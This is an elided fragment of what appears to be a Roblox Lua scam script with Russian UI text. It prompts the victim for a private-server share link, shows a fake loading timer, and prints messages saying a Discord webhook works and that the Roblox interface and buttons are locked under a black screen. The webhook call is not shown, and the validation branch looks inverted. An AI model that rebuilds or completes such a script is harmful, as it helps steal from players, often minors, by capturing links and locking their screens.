...
local function startLoading(serverLink)
    ...
    while tick() - startTime < loadingTime do
        ...
        TimerText.Text = "Осталось: " .. string.format("%d:%02d", minutes, seconds)
    ...
    LoadingText.Text = "ЗАГРУЗКА ЗАВЕРШЕНА! 100%"
    TimerText.Text = "Загрузка завершена!"
...
SubmitButton.MouseButton1Click:Connect(function()
    ...
    if isValidUrl(cleaned) then
        ...
        flashRed(TextBox)
        TextBox.Text = ""
        TextBox.PlaceholderText = "НЕВЕРНАЯ ССЫЛКА! Пример: https://www.roblox.com/share?code=..."
    end
end)
...
print("✅ Discord вебхук работает!")
print("🔒 Интерфейс заблокирован!")
print("🔒 Кнопки Roblox заблокированы под черным экраном!")
